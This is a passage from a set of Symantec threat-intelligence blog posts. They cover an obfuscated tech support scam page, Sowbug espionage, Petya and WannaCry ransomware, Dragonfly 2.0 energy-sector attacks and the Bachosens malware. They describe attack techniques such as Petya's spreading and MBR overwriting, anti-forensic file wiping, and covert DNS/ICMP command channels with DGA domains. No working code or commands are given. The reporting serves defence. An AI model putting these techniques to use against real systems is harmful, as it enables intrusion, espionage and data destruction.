playing the audio. After that we come across some interesting pieces of JavaScript code. The first piece of code loads a file named aes.js, which is actually a library code implementation of the AES algorithm. As is the usual practice with software code development, this library is then used to decrypt AES obfuscated content on the fly, as we will see later. The second piece of code contains two JavaScript functions. The first function takes AES encrypted hexadecimal content as input and uses a predefined hardcoded encryption key. The function proceeds as follows: The code in Figure.2 is a sample from the AES library which is used for this decryption process. The second JavaScript function works in a similar fashion except for a minor difference in the input format. The function takes a HTML DOM element as input, from which it then extracts the encrypted HTML content. The function then proceeds to decrypt this content, similar to the earlier function, and then replaces the encrypted HTML content in the DOM element with the decrypted content which is then presented to the user. Moving forward, the scammers use the first function repeatedly by feeding it with pre-calculated encrypted hexadecimal content, to decode it on the fly into the scam messages, which are then presented to victims. A sample block of code can be seen in Figure.3. The code seen in Figure.3 decodes into the sample seen in Figure.4. This is essentially what is visible to victims when they land on the scam web page. The scam page also has JavaScript code to look out for certain keyboard key presses. Any attempt to press ESC, F11, or the Ctrl+Alt+Delete combination is thwarted by the web page going full screen, making the scenario more alarming for the user. While this tech support scam does, to a certain extent, manage to avoid detection, it fails in other aspects. For example, by using hardcoded values such as, for example, the operating system that the victim is supposedly using (hardcoded value is Windows 7), there is a risk that users will figure out it’s a scam. Considering these types of scams are usually tailored to each victim, it’s a likely assumption that this is still a work in progress and the scammers could well add more features in the future. Even though the threat landscape has evolved a great deal in the year sincemy last tech support scam blog, these scams have continued to persist and keep generating revenue for the criminals behind them. Tech support scams have also started integrating JavaScript-based cryptocurrency miners into their web pages, which serves a dual purpose in the sense that cryptocurrency can be mined using the victim’s CPU power and, as the computer’s performance becomes sluggish due to mining, it also makes the victim believe that their computer really is infected. These new techniques employed by criminals demonstrate that this type of scam is continuing to evolve and that there is still plenty of money to be made, as such I think it is safe to assume that tech support scams are here to stay. At Symantec, we provide a variety of products to protect our customers. Our Intrusion Prevention System (IPS) security component proactively protects customers from tech support scams by blocking the malicious network activity associated with such scams using a wide variety of detections. The scam is thus blocked even before it reaches the end user. Our IPS telemetry for this year shows that the countries targeted the most by tech support scams were the U. S., UK, Canada, Australia, and Japan.

    "text": "Symantec has identified a previously unknown group called Sowbug that has been conducting highly targeted cyber attacks against organizations in South America and Southeast Asia and appears to be heavily focused on foreign policy institutions and diplomatic targets. Sowbug has been seen mounting classic espionage attacks by stealing documents from the organizations it infiltrates. Symantec saw the first evidence of Sowbug-related activity with the discovery in March 2017 of an entirely new piece of malware called Felismus used against a target in Southeast Asia. We have subsequently identified further victims on both sides of the Pacific Ocean. While the Felismus tool was first identified in March of this year, its association with Sowbug was unknown until now. Symantec has also been able to connect earlier attack campaigns with Sowbug, demonstrating that it has been active since at least early-2015 and may have been operating even earlier. To date, Sowbug appears to be focused mainly on government entities in South America and Southeast Asia and has infiltrated organizations in Argentina, Brazil, Ecuador, Peru, Brunei and Malaysia. The group is well resourced, capable of infiltrating multiple targets simultaneously and will often operate outside the working hours of targeted organizations in order to maintain a low profile. Some clues about the motivation and interests of the attackers can be found in their activities after compromising victims. For example, in a 2015 attack on one South American foreign ministry, the group appeared to be searching for very specific information. The first evidence of its intrusion dated from May 6, 2015 but activity appeared to have begun in earnest on May 12. The attackers appeared to be interested in one division of the ministry that is responsible for relations with the Asia-Pacific region. They attempted to extract all Word documents stored on a file server belonging to this division by bundling them into a RAR archive by running the following command: Interestingly, the command specified that only files modified from May 11, 2015 onwards should be archived. The attackers appear to have successfully extracted the archive because an hour later they returned, this time attempting to extract all documents modified from May 7, 2015, an extra four days’ worth of data. Presumably they either didn't find what they were looking for in the initial incursion, or else noticed something in the documents they stole earlier that prompted them to hunt for more information. The attackers didn’t stop there. Their next move was to list any remote shared drives and then attempt to access remote shares owned by the specific government office they were targeting, again attempting to extract all Word documents. In this case, they searched for any documents modified from May 9 onwards. The attackers then seemed to broaden their interest, listing the contents of various directories on remote shares, including one belonging to another division of the South American foreign ministry, this one responsible for relations with international organizations. They also deployed two unknown payloads to the infected server. In total, the attackers maintained a presence on the target’s network for four months between May and September 2015. Sowbug frequently maintains a long-term presence on the networks of targeted organizations, sometimes remaining inside a victim environment for up to six months. One of the tactics it uses to avoid drawing attention to itself is impersonating commonly used software packages such as Windows or Adobe Reader. It has never attempted to compromise the software itself. Rather, it gives its tools file names similar to those used by the software and places them in directory trees that could be mistaken for those used by the legitimate software. This allows the attackers to hide in plain sight, as their appearance in process listings is unlikely to arouse suspicion. For example, in September 2016, Sowbug infiltrated an organization in Asia, deploying the Felismus backdoor on one of its computers, Computer A, using the file name adobecms.exe in CSIDL_WINDOWS\\debug. From there, it installed additional components and tools to a directory named CSIDL_APPDATA\\microsoft\\security. The attackers then began to perform reconnaissance activities on Computer A via cmd.exe, collecting system-related information, such as the OS version, hardware configuration, and network information. They then performed some further reconnaissance, attempting to identify all installed applications on the computer. They returned four days later, creating a sub-directory called “common” in the Adobe directory of the Program Files folder, i.e. c:\\Program Files\\Adobe\\common, and installed another tool in this sub-directory, again named adobecms.exe. This was possibly an updated version of the backdoor. The attackers’ network reconnaissance appeared to be successful because a second computer of interest in the organization was identified and compromised. The attackers then returned to Computer A, installing another executable called fb.exe. This file appears to be used to copy Felismus across the network to other computers and there is evidence that the attackers used it to attempt to infect at least two more computers. The attackers took further measures to remain under the radar by carrying out their operations outside of standard office hours. In this case, the attackers maintained a presence on the target’s network for nearly six months between September 2016 and March 2017. How Sowbug performs its initial infiltration of a target’s network remains unknown. In some cases, there was no trace of how Felismus made its way onto compromised computers, meaning it was likely deployed from other compromised computers on the network. In other attacks, there was evidence that Felismus was installed using a tool known as Starloader (detected by Symantec as Trojan. Starloader). This is a loader that installs and decrypts data from a file called Stars.jpg. Additionally, Starloader was also observed deploying additional tools used by the attackers, such as credential dumpers and keyloggers. It is still unknown how Starloader is installed on the compromised computer. One possibility is that the attackers use fake software updates to install files. Symantec has found evidence of Starloader files being named AdobeUpdate.exe, AcrobatUpdate.exe, and INTELUPDATE. EXE among others. These were used to create versions of the Felismus backdoor as well as other tools. While cyber espionage attacks are often seen against targets in the U. S., Europe, and Asia, it is much less common to see South American countries targeted. However, the number of active cyber espionage operations has increased steadily in recent years and the emergence of Sowbug is a reminder that no region is immune to this kind of threat. Symantec customers are protected against Sowbug and Symantec has also made efforts to notify identified targets of its operations. Customers with Intelligence Services or WebFilter-enabled products are protected against activity associated with the Sowbug group.

    "text": "While ransomware has long been one of the main cyber threats to businesses, the past number of months have seen organizations more exposed than ever. Symantec’s latest research paper on ransomwarehas found that businesses were the main victims of theWannaCryandPetyaoutbreaks, with corporate networks the ideal breeding ground for this new generation of self-propagating threats. Our research found that overall ransomware infection numbers have continued to trend upwards. During the first six months of 2017, Symantec blocked just over 319,000 ransomware infections. If this infection rate continued for the full year, 2017 would be a significant increase over 2016, when a total of 470,000 infections were blocked. Contributing to this increase was a spike in blocked infections during May and June 2017, the months when the WannaCry and Petya outbreaks occurred. This year saw the arrival of a new generation of self-propagating ransomware. WannaCry, which was the first to appear, caused global panic due to its ability to spread itself across the networks of infected organizations and then spread to other organizations across the internet. Petya mimicked some of the techniques employed by WannaCry to spread itself across networks. What enabled WannaCry to spread so quickly was that its developers had incorporated the leaked “EternalBlue” exploit into its code. An exploit of a vulnerability in the Windows implementation of the Server Message Block (SMB) protocol (CVE-2017-0144), it had been patched two months earlier, but there were still enough unpatched computers online for WannaCry to spread quickly. EternalBlue allowed WannaCry to act like a worm, spreading itself to other unpatched computers on the local network and across the internet by scanning random IP addresses in an attempt to find other vulnerable computers. Six weeks later, a new variant of Petya adopted similar tactics, using EternalBlue as a propagation mechanism, but also incorporating other SMB network spreading techniques, which meant it could spread within organizations to computers that had been patched against EternalBlue. Another difference from WannaCry was that Petya was far more targeted, configured to mainly affect organizations in Ukraine, although other organizations in other countries were also affected. The impact of WannaCry and Petya makes it quite likely that more attackers will attempt to replicate the tactics used by deploying ransomware as a worm. The propagation mechanisms employed by both ransomware families enabled the threats to spread quickly across an entire computer network. Many consumer computers are not connected to a network, unlike those found in organizations. While WannaCry and Petya also did have the ability to spread across the internet to other vulnerable computers, this means of transmission again largely affected other organizations. Most home internet routers would have blocked infection attempts involving the EternalBlue exploit. WannaCry and Petya’s disproportionate impact on organizations can be seen in infection statistics. During 2015 and 2016, businesses accounted for between 29 and 30 percent of ransomware infections. That figure shot up to 42 percent in the first half of 2017, with a major spike in business infections during May and June, the months WannaCry and Petya spread. Organizations need to prepare themselves for the threat posed by self-propagating ransomware. The Petya outbreak demonstrated that even without EternalBlue, attackers can create worm-like ransomware that is capable of spreading across a network. While it does require more skill and the use of additional tools, such as credential stealers, the potential rewards are much greater. During the first six months of 2017, the average ransom demand seen in new ransomware families was US$544. This follows on from a period of rapid inflation in ransom demands. During 2016, the average ransom demand seen in new ransomware families increased dramatically, rising more than threefold from $294 to $1,077. This could suggest that after a period of trial-and-error in 2016, many attackers have settled on a ransom demand of around $500 as the “sweet spot” for ransom demands. While this may not sound like a major loss for an organization, most ransom demands are for a single infected computer. If an organization finds itself with tens or hundreds of infected computers, the price demanded by attackers will quickly add up. WannaCry and Petya proved that ransomware is not a predictable threat and organizations who are complacent may be caught out. Building a multi-layered defense ensures that any point of failure is mitigated by other defensive practices. This should include not only regularly patching vulnerabilities and ensuring critical systems are backed up, but also employing multiple, overlapping, and mutually supportive defensive systems to guard against single-point failures in any specific technology or protection method. Adopting a multi-layered approach to security minimizes the chance of infection. Symantec has a comprehensive strategy that protects against ransomware in three stages.

    "text": "A new strain of the Petya ransomware started propagating on June 27, 2017, infecting many organizations. Similar toWannaCry, Petya uses the EternalBlue exploit as one of the means to propagate itself. However, it also uses classic SMB network spreading techniques, meaning that it can spread within organizations, even if they have patched against EternalBlue. Symantec has confirmed that MEDoc, a tax and accounting software package, is used for the initial insertion of Petya into corporate networks. MEDoc is widely used in Ukraine, indicating that organizations in that country were the primary target. After gaining an initial foothold, Petya then uses a variety of methods to spread across corporate networks. Petya is a worm, meaning it has the ability to self-propagate. It does this by building a list of target computers and using two methods to spread to those computers. Petya builds a list of IP addresses to spread to, which includes primarily addresses on the local area network (LAN) but also remote IPs. The full list is built as follows: Once the list of target computers has been identified, Petya builds out a list of user names and passwords it can use to spread to those targets. The list of user names and passwords is stored in memory. It uses two methods to gather credentials: Petya uses two primary methods to spread across networks: Petya checks for the presence of the following processes which are used by Norton products and Symantec Endpoint Protection: If found, Petya will not use the EternalBlue and EternalRomance exploits to spread. Petya is initially executed via rundll32.exe using the following command: Once the DLL has been loaded, it will first attempt to remove itself from the infected system. This is done by opening the file and overwriting its contents with null bytes before finally deleting the file from disk. Overwriting the file with null bytes is used as an attempt to thwart recovery of the file using forensic techniques. Next, it attempts to create the following file to be used as a flag indicating that the computer has been infected: Once installed, Petya proceeds to modify the master boot record (MBR). This allows it to hijack the normal loading process of the infected computer during the next system reboot. The modified MBR is used to encrypt the hard disk while simulating a CHKDSK screen. It then displays a ransom note to the user. MBR modification does not succeed if the threat is executed as a normal user but the threat will still attempt to spread across the network At this point, a system reboot is scheduled using the following command: By scheduling and not forcing a reboot, it provides time to allow Petya to spread to other computers in the network before user-mode encryption occurs. Petya performs encryption in two ways: Once spreading has occurred, Petya then lists all files on any fixed drive (e.g. C:\\) and checks for any of the following file extensions (skipping the%Windir%directory of that drive): .3ds .7z .accdb .ai .asp .aspx .avhd .back .bak .c .cfg .conf .cpp .cs .ctl .dbf .disk .djvu .doc .docx .dwg .eml .fdb .gz .h. hdd .kdbx .mail .mdb .msg .nrg .ora .ost .ova .ovf .pdf .php .pmf .ppt .pptx .pst .pvi .py .pyc .rar .rtf .sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc .vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip If any of the file extensions match that of the file list, encryption occurs. As mentioned, encryption performed by Petya is twofold; firstly specific file types are encrypted in user-mode after spreading occurs and the key is encrypted with an embedded public key, Base64 encoded, and appended to the README. TXT file. After a system reboot occurs, the infected MBR is loaded, disk encryption begins, and the ransom note is displayed to the user. The \"installation key\" referenced in the ransom note is a randomly generated string that is displayed to the user. A randomly generated Salsa20 key is then used for disk encryption. As there is no relationship between the “installation key” and Salsa20 key, the disk can never be decrypted. This demonstrates that Petya is more accurately a wiper rather than ransomware. Symantec Endpoint Protection (SEP) and Norton products proactively protect customers against attempts to spread Petya using EternalBlue. SONAR behavior detection technology also proactively protects against Petya infections. Symantec products using definitions version 20170627.009 also detect Petya components asRansom. Petya. Petya has been in existence since 2016. It differs from typical ransomware as it doesn’t just encrypt files, it also overwrites and encrypts the master boot record (MBR). In this latest attack, the following ransom note is displayed on infected computers, demanding that $300 in bitcoins be paid to recover files: The MEDoc accounting software is used to drop and install Petya into organizations’ networks. Once in the network it uses two methods to spread. One of the ways in which Petya propagates itself is by exploiting theMS17-010vulnerability, also known as EternalBlue. It also spreads by acquiring user names and passwords and spreading across network shares. Petya is primarily impacting organizations in Europe. It is unclear at this time, however, the initial infector is software used solely in Ukraine, indicating that organizations there were the initial targets. Symantec recommends that users do not pay the ransom, particularly as there is no evidence that files will be restored. Symantec has the following IPS protection in place to protect customers against these attacks: For further detail seehttps://email.status.symantec.com/ Symantec is continuing to analyze this threat and will post further information as soon as it becomes available.

    "text": "Symantec has uncovered further links to more closely tie the WannaCry attacks with the Lazarus group. For further details, see:WannaCry: Ransomware attacks show strong links to Lazarus group Symantec has uncovered two possible links that loosely tie the WannaCry ransomware attack and the Lazarus group: While these findings do not indicate a definitive link between Lazarus and WannaCry, we believe that there are sufficient connections to warrant further investigation. We will continue to share further details of our research as it unfolds. A virulent new strain of ransomware known as WannaCry (Ransom. Wannacry) has hit hundreds of thousands of computers worldwide since its emergence on Friday, May 12. WannaCry is far more dangerous than other common ransomware types because of its ability to spread itself across an organization’s network by exploiting critical vulnerabilities in Windows computers, which were patched by Microsoft in March 2017 (MS17-010). The exploit, known as “Eternal Blue,” was released online in April in the latest of aseries of leaks by a group known as the Shadow Brokers, who claimed that it had stolen the data from the Equation cyber espionage group. Symantec Endpoint Protection (SEP) and Norton have proactively blocked any attempt to exploit the vulnerabilities used by WannaCry, meaning customers were fully protected before WannaCry first appeared. SEP14 Advanced Machine Learning proactively blocked all WannaCry infections on day zero, without any updates. The Blue Coat Global Intelligence Network (GIN) provides automatic detection to all enabled products for web-based infection attempts. Symantec and Norton customers are automatically protected against WannaCry using a combination of technologies. Proactive protection was provided by: Customers should have these technologies enabled for full proactive protection. SEP customers are advised to migrate to SEP 14 to take advantage of the proactive protection provided by Advanced Machine Learning signatures. WannaCry searches for and encrypts 176 different file types and appends . WCRY to the end of the file name. It asks users to pay a US$300 ransom in bitcoins. The ransom note indicates that the payment amount will be doubled after three days. If payment is not made after seven days it claims the encrypted files will be deleted. However Symantec has not found any code within the ransomware which would cause files to be deleted. Decryption of encrypted files is not possible at present but Symantec researchers continue to investigate the possibility. Seethis articlefor further details. If you have backup copies of affected files, you may be able to restore them. Symantec does not recommend paying the ransom. In some cases, files may be recovered without backups. Files saved on the Desktop, My Documents, or on a removable drive are encrypted and their original copies are wiped. These are not recoverable. Files stored elsewhere on a computer are encrypted and their original copies are simply deleted. This means they could be recovered using an undelete tool. WannaCry first appeared on Friday, May 12. Symantec saw a dramatic upsurge in the number of attempts to exploit the Windows vulnerabilities used by WannaCry from approximately 8:00 GMT onwards. The number of exploit attempts blocked by Symantec dropped slightly on Saturday and Sunday but remained quite high. Exploit numbers increased on Monday, presumably as people returned to work after the weekend. Any unpatched Windows computer is potentially susceptible to WannaCry. Organizations are particularly at risk because of its ability to spread across networks and a number of organizations globally have been affected, the majority of which are in Europe. However individuals can also be affected. Current WannaCry activity is not believed to be part of a targeted attack. WannaCry has the ability to spread itself within corporate networks without user interaction, by exploiting known vulnerabilities in Microsoft Windows. Computers that do not have the latest Windows security updates applied are at risk of infection. While WannaCry can spread itself across an organization’s networks by exploiting a vulnerability, the initial means of infection—how the first computer in an organization is infected—remains unconfirmed. Symantec has seen some cases of WannaCry being hosted on malicious websites, but these appear to be copycat attacks, unrelated to the original attacks. The WannaCry attackers request that the ransom be paid using Bitcoins. WannacCy generates a unique Bitcoin wallet address for each infected computer, however due to a race condition bug this code does not execute correctly. WannaCry then defaults to three hardcoded Bitcoin addresses for payment. The attackers are unable to identify which victims have paid using the hardcoded addresses, meaning that victims are unlikely to get their files decrypted. The WannaCry attackers subsequently released a new version of the malware that corrected this flaw, however this version was not as successful as the original. On May 18, a new notice was displayed on infected computers informing victims that files will be decrypted if the ransom is paid. Network-based protectionSymantec has the following IPS protection in place to block attempts to exploit the MS17-010 vulnerability: SONAR behavior detection technology Advanced Machine Learning For expanded protection and identification purposes, the following Antivirus signatures have been updated: Customers should run LiveUpdate and verify that they have the following definition versions or later installed in order to ensure they have the most up-to-date protection: The following IPS signature also blocks activity related to Ransom.

    "text": "The energy sector in Europe and North America is being targeted by a new wave ofcyber attacksthat could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as Dragonfly. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet periodfollowing exposure by Symantecand a number of other researchers in 2014. This “Dragonfly 2.0” campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group. The energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably,disruptions to Ukraine’s power systemin 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports ofattempted attacks on the electricity gridsin some European countries, as well as reports ofcompanies that manage nuclear facilities in the U. S. being compromisedby hackers. The Dragonfly group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the Dragonfly group. Symantec has evidence indicating that the Dragonfly 2.0 campaign has been underway since at least December 2015 and has identified a distinct increase in activity in 2017. Symantec has strong indications of attacker activity in organizations in the U. S., Turkey, and Switzerland, with traces of activity in organizations outside of these countries. The U. S. and Turkey were also among the countries targeted by Dragonfly in its earlier campaign, though the focus on organizations in Turkey does appear to have increased dramatically in this more recent campaign. As it did in its prior campaign between 2011 and 2014, Dragonfly 2.0 uses a variety of infection vectors in an effort to gain access to a victim’s network, including malicious emails, watering hole attacks, and Trojanized software. The earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year’s Eve party to targets in the energy sector in December 2015. The group conducted further targeted malicious email campaigns during 2016 and into 2017. The emails contained very specific content related to the energy sector, as well as some related to general business concerns. Once opened, the attached malicious document would attempt to leak victims’ network credentials to a server outside of the targeted organization. In July, Cisco blogged aboutemail-based attacks targeting the energy sector using a toolkit called Phishery. Some of the emails sent in 2017 that were observed by Symantec were also using the Phishery toolkit (Trojan. Phisherly), to steal victims’ credentials via a template injection attack. This toolkit became generally available on GitHub in late 2016, As well as sending malicious emails, the attackers also used watering hole attacks to harvest network credentials, by compromising websites that were likely to be visited by those involved in the energy sector. The stolen credentials were then used in follow-up attacks against the target organizations. In one instance, after a victim visited one of the compromised servers,Backdoor. Goodorwas installed on their machine via PowerShell 11 days later. Backdoor. Goodor provides the attackers with remote access to the victim’s machine. In2014, Symantec observed the Dragonfly group compromise legitimate software in order to deliver malware to victims, a practice also employed in the earlier 2011 campaigns. In the 2016 and 2017 campaigns the group is using the evasion framework Shellter in order to develop Trojanized applications. In particular,Backdoor. Dorshelwas delivered as a trojanized version of standard Windows applications. Symantec also has evidence to suggest that files masquerading as Flash updates may be used to install malicious backdoors onto target networks—perhaps by using social engineering to convince a victim they needed to download an update for their Flash player. Shortly after visiting specific URLs, a file named “install_flash_player.exe” was seen on victim computers, followed shortly by theTrojan. Karagany. Bbackdoor. Typically, the attackers will install one or two backdoors onto victim computers to give them remote access and allow them to install additional tools if necessary. Goodor, Karagany. B, and Dorshel are examples of backdoors used, along withTrojan. Heriplor. There are a number of indicators linking recent activity with earlier Dragonfly campaigns. In particular, the Heriplor and Karagany Trojans used in Dragonfly 2.0 were both also used in the earlier Dragonfly campaigns between 2011 and 2014. Trojan. Heriplor is a backdoor that appears to be exclusively used by Dragonfly, and is one of the strongest indications that the group that targeted the western energy sector between 2011 and 2014 is the same group that is behind the more recent attacks. This custom malware is not available on the black market, and has not been observed being used by any other known attack groups. It has only ever been seen being used in attacks against targets in the energy sector. Trojan. Karagany. B is an evolution ofTrojan. Karagany, which was previously used by Dragonfly, and there are similarities in the commands, encryption, and code routines used by the two Trojans. Trojan. Karagny. B doesn’t appear to be widely available, and has been consistently observed being used in attacks against the energy sector. However, the earlier Trojan. Karagany was leaked on underground markets, so its use by Dragonfly is not necessarily exclusive. Sabotage attacks are typically preceded by an intelligence-gathering phase where attackers collect information about target networks and systems and acquire credentials that will be used in later campaigns. The most notable examples of this are Stuxnet and Shamoon, where previously stolen credentials were subsequently used to administer their destructive payloads. The original Dragonfly campaigns now appear to have been a more exploratory phase where the attackers were simply trying to gain access to the networks of targeted organizations. The Dragonfly 2.0 campaigns show how the attackers may be entering into a new phase, with recent campaigns potentially providing them with access to operational systems, access that could be used for more disruptive purposes in future. The most concerning evidence of this is in their use of screen captures. In one particular instance the attackers used a clear format for naming the screen capture files, [machine description and location].[organization name]. The string “cntrl” (control) is used in many of the machine descriptions, possibly indicating that these machines have access to operational systems. While Symantec cannot definitively determine Dragonfly’s origins, this is clearly an accomplished attack group. It is capable of compromising targeted organizations through a variety of methods; can steal credentials to traverse targeted networks; and has a range of malware tools available to it, some of which appear to have been custom developed. Dragonfly is a highly focused group, carrying out targeted attacks on energy sector targets since at least 2011, with a renewed ramping up of activity observed in the last year. Some of the group’s activity appears to be aimed at making it more difficult to determine who precisely is behind it: Conflicting evidence and what appear to be attempts at misattribution make it difficult to definitively state where this attack group is based or who is behind it. What is clear is that Dragonfly is a highly experienced threat actor, capable of compromising numerous organizations, stealing information, and gaining access to key systems. What it plans to do with all this intelligence has yet to become clear, but its capabilities do extend to materially disrupting targeted organizations should it choose to do so. Symantec customers are protected against Dragonfly activity, Symantec has also made efforts to notify identified targets of recent Dragonfly activity. Symantec has the following specific detections in place for the threats called out in this blog: Symantec has also developed a list of Indicators of Compromise to assist in identifying Dragonfly activity: Customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have previously received reporting on the Dragonfly 2.0 group, which included methods of detecting and thwarting the activities of this adversary. Dragonfly relies heavily on stolen credentials to compromise a network. Important passwords, such as those with high privileges, should be at least 8-10 characters long (and preferably longer) and include a mixture of letters and numbers. Encourage users to avoid reusing the same passwords on multiple websites and sharing passwords with others should be forbidden. Delete unused credentials and profiles and limit the number of administrative-level profiles created. Employ two-factor authentication (such asSymantec VIP) to provide an additional layer of security, preventing any stolen credentials from being used by attackers. Emphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This should include the deployment of regularly updated firewalls as well as gateway antivirus, intrusion detection or protection systems (IPS), website vulnerability with malware protection, and web security gateway solutions throughout the network. Implement and enforce a security policy whereby any sensitive data is encrypted at rest and in transit. Ensure that customer data is encrypted as well. This can help mitigate the damage of potential data leaks from within an organization. Implement SMB egress traffic filtering on perimeter devices to prevent SMB traffic leaving your network onto the internet. Educate employees on the dangers posed by spear-phishing emails, including exercising caution around emails from unfamiliar sources and opening attachments that haven’t been solicited. A full protection stack helps to defend against emailed threats, includingSymantec Email Security.cloud, which can block email-borne threats, andSymantec Endpoint Protection, which can block malware on the endpoint. Symantec Messaging Gateway’sDisarm technology can also protect computers from threats by removing malicious content from attached documents before they even reach the user. Understanding the tools, techniques, and procedures (TTP) of adversaries through services likeDeepSight Adversary Intelligencefuels effective defense from advanced adversaries like Dragonfly 2.0. Beyond technical understanding of the group, strategic intelligence that informs the motivation, capability, and likely next moves of the adversaries ensures more timely and effective decisions in proactively safeguarding your environment from these threats.

    "text": "In attacks reminiscent of the early days of malware, a lone wolf threat actor who appears to be based in a disputed part of eastern Moldova is using advanced malware to carry out cyber attacks against large organizations for relatively modest rewards. The malware in question, Trojan. Bachosens, was so advanced that Symantec analysts initially thought they were looking at the work of nation-state actors. However, further investigation revealed a 2017 equivalent of the hobbyist hackers of the 1990s—the only difference being this hacker wasn’t out for bragging rights. He was out for financial reward. This lone wolf attacker—who we call Igor—is not an average cyber criminal with the aim of infecting as many victims as possible. Rather, he has been carrying out highly targeted attacks on specific organizations. Igor developed a specialized tool, a piece of malware called Bachosens, to gain access to at least two large organizations, an international airline and a Chinese auto-tech company. Symantec believes that Igor planted the malware through the use of spear-phishing emails, a tactic typically employed by nation-state actors. Igor targeted the auto-tech company in order to steal car diagnostics software. This software retails for approximately $1,100 through legitimate channels. Igor is selling it for just a few hundred dollars on underground forums and websites he has created expressly for this purpose. Considering the audacity of this attack, the financial rewards for Igor are pretty low. There are indications that Igor has been active for quite some time. Symantec first identified the use of Bachosens in 2014. However, the auto-tech company targeted by Igor issued an alert as far back as 2009 about its software being sold by an unauthorized reseller. Symantec was able to confirm links between the domains mentioned in this alert and Igor, indicating he has been active for almost 10 years. Symantec researchers’ analysis of Igor’s activities allowed us to gain an insight into his methods and areas of focus. Based on publicly available information, Symantec was able to find likely connections between Igor and an auto parts store located in Transnistria, a disputed territory in Moldova. His involvement in the automotive industry could explain why he showed an interest in targeting the auto-tech company. While the targeting of the Chinese auto-tech company with this malware seems to have an obvious aim—to steal software with the aim of selling it and making money—Symantec also saw some activity that is harder to explain. The Bachosens Trojan was also found on a number of systems in a large commercial airline, however, the motive for this attack is unclear at this time. Symantec is confident that this malware is only being used by Igor. Our evidence also shows that Igor’s campaigns are highly targeted, therefore it’s unlikely that this infection was accidental. There is also evidence Igor attempted to infect an online gambling organization. He used targeted spear-phishing emails with an attachment containing malicious macros in this infection attempt, which was ultimately unsuccessful. This is an attacker who is made up of contradictions: he uses well-developed malware, but makes some basic operational mistakes that allowed Symantec researchers to uncover a lot about his activities. As previously mentioned, this malware is highly sophisticated, displaying a technical competency similar to that seen in malware used by nation-state actors, indicating that its developer has a high level of skill. It is possible Igor purchased this malware from another developer, however, as no one else has been observed online using it, Symantec researchers believe this is unlikely, and believe that Igor developed this malware himself. Elements of this attack that make it stand out from the ordinary include the use of rarely used covert communication channels, such as DNS, ICMP, and HTTP, to communicate with the command and control (C&C) server. The attacker also encrypts the victim’s information before it is transmitted to the C&C server, with the malware programmed to create a set of ephemeral AES keys to encrypt the data before sending it. He also sends these communications over IPv6, which can make them harder to detect than if sent over IPv4. Igor also uses dynamic DNS (DDNS) and domain generation algorithms (DGA). DGA is used to generate a prefix, which is added to a DDNS controlled root domain to form the C&C server. Oddly, while malware that uses DGA normally creates hundreds of domains at a time—with the aim being to make it more difficult for the malware to be detected—this attacker only created 13 domains using DGA over the course of an entire year. One domain was valid for the entire year, with one new domain created each month. Creating such a small number of domains essentially defeats the purpose of using DGA, as it would only allow the attacker to avoid the most basic cyber defenses. This unusual use of DGA is just one of the parts of Igor’s operations that demonstrates a lack of polish, and shows an interesting contradiction between the advanced level of the malware and the rather unpolished way in which it is used. Igor submitted malware samples to Virus Total to test the detection capabilities of defenders, and used development names (such as mod_exe and mod_dll) in the submission, which would draw attention to it. It is known that malicious hackers often use Virus Total, a tool that analyzes URLs and files to detect malware, to test the malware they are developing. Using development file names indicates that a piece of malware is a work in progress and is more likely to draw the attention of investigators. The malware was also found packaged with computer games, which is not generally something that would be seen in advanced attacks. In fact, Symantec researchers first realized that this malware was unlikely to be the work of a nation state or sophisticated cyber attacker when they found it packaged with an online video game. Igor also used an unobfuscated keylogger, something professional cyber attackers are very unlikely to do. He also posted personal information on publicly accessible auto forums where he was attempting to sell the stolen software, exposing himself as a likely perpetrator. These various missteps indicate that while Igor may be talented enough to create highly advanced malware, he lacks the expertise of more professional cyber attackers. Symantec researchers’ investigations have turned up quite a lot of information about this cyber attacker. Symantec believes he may be based in the town of Tiraspol in eastern Moldova. Officially, Tiraspol is the second-largest city in Moldova, but it is also the capital of the self-declared republic of Transnistria, which is not recognized as an independent state by the UN. The dominant language in Transnistria is Russian, and there were Russian strings used in the Bachosens malware, and communication with the C&C server uses what appears to be the Russian equivalents of size suffixes for KB, MB, GB, and TB. This had indicated to researchers that the individual behind this malware was likely Russian speaking. The level of information the attacker knowingly or negligently revealed about himself online gave us high confidence that he is an individual involved in the auto industry who is based in this part of Eastern Europe. His likely location in Tiraspol may also explain why he appears to have such modest aims when it comes to the gains he seems to be making from cyber crime. Although it is hard to get official data given it is a disputed territory, the average monthly salary in Transnistria has been reported as being as little as a few hundred euro. In that context, selling stolen software online for a few hundred euro could represent quite the windfall for an individual based in that part of the world. While we have gleaned a lot of information about this attack, much of this attacker’s activity remains a mystery, such as the motivations behind some of his activity, and where he may have acquired the skills to create such sophisticated malware, while clearly demonstrating lack of expertise in other areas. However, this activity does show us that while nation-state actors and organized cyber crime gangs carrying off big heists may be what grabs headlines, there are still lone wolf attackers out there making a comfortable living from cyber crime.

